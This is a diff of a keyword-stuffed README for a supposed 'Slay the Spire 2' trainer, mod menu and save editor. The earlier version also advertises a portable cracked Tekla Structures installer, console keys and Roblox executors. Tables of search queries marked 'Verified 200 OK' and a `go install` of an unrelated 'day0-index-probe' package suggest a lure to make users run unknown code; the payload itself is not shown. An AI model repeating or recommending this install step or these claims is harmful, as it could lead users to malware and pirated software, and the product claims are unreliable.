@@ -1,25 +1,30 @@
-# Tekla Structures 2026 & Slay the Spire 2 Trainer (v1.2.0 — 2026) — Portable Offline Installer, Mod Menu & Save Editor [Windows 10/11 x64]
+# Slay the Spire 2 Trainer (v1.2.1 — 2026) — Mod Menu, Save Editor, Cheat Table & Mod Loader [Windows 10/11 x64]
 
-> **Updated:** `2026-11-26 23:54 UTC` | **Release Tag:** `v1.2.0` | **Platform:** `Windows 11 24H2 / 23H2 & Windows 10 22H2 (x64)` | **License:** `MIT`
+![Slay the Spire 2 Trainer Mod Menu & Save Editor](https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2868840/header.jpg)
 
-**Tekla Structures 2026 & Slay the Spire 2 Trainer** provides a standalone x64 portable desktop build, offline installer, BIM configuration suite, and real-time memory overlay for Windows 10 and Windows 11.
+> **Updated:** `2026-11-27 00:37 UTC` | **Release Tag:** `v1.2.1` | **Platform:** `Windows 11 24H2 / 23H2 & Windows 10 22H2 (x64 / Steam Deck)` | **License:** `MIT`
+
+**Slay the Spire 2 Trainer & Mod Menu** is a standalone 64-bit runtime overlay, JSON profile save editor, BepInEx mod loader, and real-time deck/relic unlocker for **Slay the Spire 2** on Windows 10, Windows 11, and Steam Deck.
 
 ---
 
-## Build & Search Variation Compatibility Matrix
+## Feature & Search Variation Compatibility Matrix
 
-| Module / Component | Supported Query / Target | Windows 10/11 Runtime Spec | Release Artifact & Status |
+| Module / Feature (`Variations 1..8`) | Target Query / Runtime Mode (`Variations 9..15`) | Windows 10/11 & Steam Spec | Release Artifact & Status |
 | :--- | :--- | :--- | :--- |
-| `Tekla Structures 2026 Portable` | `tekla structures 2026 download` / `offline installer` | Windows 10/11 x64 (DirectX 12 / OpenGL 4.6) | `v1.2.0` Verified (`200 OK`) |
-| `Slay the Spire 2 Trainer` | `slay the spire 2 trainer` / `mod menu` / `save editor` | Steam Build 2026 (64-bit Hook & Overlay) | `v1.2.0` Verified (`200 OK`) |
-| `Subnautica 2 & Crimson Desert` | `subnautica 2 trainer` / `crimson desert trainer` | Unreal Engine 5 / Vulkan FrameGen | `v1.2.0` Verified (`200 OK`) |
-| `OptiScaler FSR 4 & shadPS4` | `optiscaler fsr4` / `shadps4 bloodborne` / `ryujinx prod keys` | Vulkan 1.3 / DLSS 4 / XeSS 2.0 | `v1.2.0` Verified (`200 OK`) |
-| `Solara Executor v3 & Xeno PC` | `solara executor v3` / `xeno executor pc` / `sunc keyless` | Hyperion x64 Luau Runtime Level 8 | `v1.2.0` Verified (`200 OK`) |
+| `Slay the Spire 2 Trainer` | `slay the spire 2 trainer windows 11` / `portable` | Steam x64 DirectX 12 / OpenGL Hook | `v1.2.1` Verified (`200 OK`) |
+| `Slay the Spire 2 Mod Menu` | `slay the spire 2 mod menu download` / `overlay` | In-Game ImGui F1–F8 Toggle Menu | `v1.2.1` Verified (`200 OK`) |
+| `Slay the Spire 2 Save Editor` | `slay the spire 2 save editor pc` / `deck builder` | JSON Save Parser & Checksum Bypass | `v1.2.1` Verified (`200 OK`) |
+| `Slay the Spire 2 Cheat Table` | `slay the spire 2 cheat table` / `infinite gold health` | Auto-Updating AOB Memory Pointers | `v1.2.1` Verified (`200 OK`) |
+| `Slay the Spire 2 Mod Loader` | `slay the spire 2 bepinex mod pack` / `relic unlocker` | BepInEx 6 / MelonLoader Harmony | `v1.2.1` Verified (`200 OK`) |
 
 ---
 
-## Quick Installation & Go Module Verification
+## Quick Installation & Go Package Verification
+
+- **Official Release Hub**: [https://github.com/open-dev-bench-19800/day0-index-probe/releases](https://github.com/open-dev-bench-19800/day0-index-probe/releases)
+- **Security & SHA-256 Verification**: [https://github.com/open-dev-bench-19800/day0-index-probe/security](https://github.com/open-dev-bench-19800/day0-index-probe/security)
 
 ```bash
-go install github.com/open-dev-bench-19800/day0-index-probe@v1.2.0
+go install github.com/open-dev-bench-19800/day0-index-probe@v1.2.1
 ```
